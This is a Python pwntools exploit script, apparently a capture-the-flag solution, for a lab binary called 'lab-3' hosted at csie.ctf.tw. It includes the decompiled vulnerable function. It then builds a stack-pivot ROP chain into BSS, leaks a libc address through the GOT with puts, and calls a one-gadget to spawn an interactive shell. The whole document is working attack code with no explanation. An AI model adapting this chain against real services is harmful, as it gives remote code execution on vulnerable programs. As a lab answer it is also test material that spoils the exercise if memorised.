'''
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf; // [sp+0h] [bp-20h]@1
  read(0, &unk_601060, 0x280uLL);
  printf("Hello! %s\nWhat do you want to say?\n", &unk_601060);
  read(0, &buf, 0x30uLL);
  if ( strlen(&buf) > 0x20 )
  {
    puts("Nop");
    _exit(0);
  }
  puts("Only one gadget, Hacker go away~");
  return 0LL;
}
'''
from pwn import *
from termcolor import *

bss_memory_start = 0x601060
bss_memory_end_00= 0x601100
leave_ret = 0x400818 
buffer_end = 0x601060 + 0x280 # buffer end
# Change BSS
buf_2_migrate = b'\x90' * 0x20 + p64(bss_memory_end_00) + p64(leave_ret)
l = [ '{:0>2x}'.format(ord(c)) for c in buf_2_migrate ]
for i in range(0,len(l),8):
  print(''.join(l[i:i+8]))
# change rbp to 0x601100
buf_1_migrate = b'\x90' * (bss_memory_end_00 - bss_memory_start) # padding to where we jmp
buf_1_migrate += p64(buffer_end) # rbp next to buffer end.
# now, we need to leak libc_base.

# 000000600ff0  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0

__libc_start_main_GOT = 0x600ff0

#   2203: 0000000000021ab0   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
#    422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
__libc_start_main_offset = 0x21ab0

# next ROP chain: pop rdi gadget -> libc_start_main_got -> puts_call_plt
# 0x0000000000400883 : pop rdi ; ret
# 00000000004005e0 <puts@plt>:
pop_rdi_gadget = 0x400883
puts_plt = 0x4005e0

buf_1_migrate += p64(pop_rdi_gadget) + p64(__libc_start_main_GOT) + p64(puts_plt)
clean_read = 0x4007c4
main_addr = 0x400773
'''
  4007c4: 48 8d 45 e0           lea    rax,[rbp-0x20]
  4007c8: ba 30 00 00 00        mov    edx,0x30
  4007cd: 48 89 c6              mov    rsi,rax
  4007d0: bf 00 00 00 00        mov    edi,0x0
  4007d5: b8 00 00 00 00        mov    eax,0x0
  4007da: e8 31 fe ff ff        call   400610 <read@plt>
'''
buf_1_migrate += p64(clean_read)

# r = process('./lab-3')
r = remote('csie.ctf.tw',10131)

r.sendafter("something:\n",buf_1_migrate)
# print('stage 1:',r.recv())
r.sendafter("say?\n",buf_2_migrate)
print('stage 2:',r.recvuntil('~'))
print(r.recvline())
libc_start_leak = u64(r.recv().split('\n')[0].ljust(8,'\x00')) 
libc_base = libc_start_leak - __libc_start_main_offset
# 0x809c0
# raw_input('waiting_for_you~')

print(colored('libc_base: %x' % libc_base,'red'))


# 0x000000000003eb0b : pop rcx ; ret
libc_pop_rcx_gadget = 0x3eb0b
# one gadget: 0x4f2c5 rcx == NULL
libc_one_gadget = 0x4f2c5

# ----------------------------------------------- rbp - 0x20
buf_3_migrate = p64(0) # trash, or you can use rbp [migration].
buf_3_migrate += p64(libc_pop_rcx_gadget+libc_base)
buf_3_migrate += p64(0) 
buf_3_migrate += p64(libc_one_gadget + libc_base)
# ----------------------------------------------- now rbp
buf_3_migrate += p64(buffer_end-0x20) # point to above
buf_3_migrate += p64(leave_ret) # leave ret.

r.send(buf_3_migrate+'\n')
# r.send(buf_2_migrate)
r.interactive()
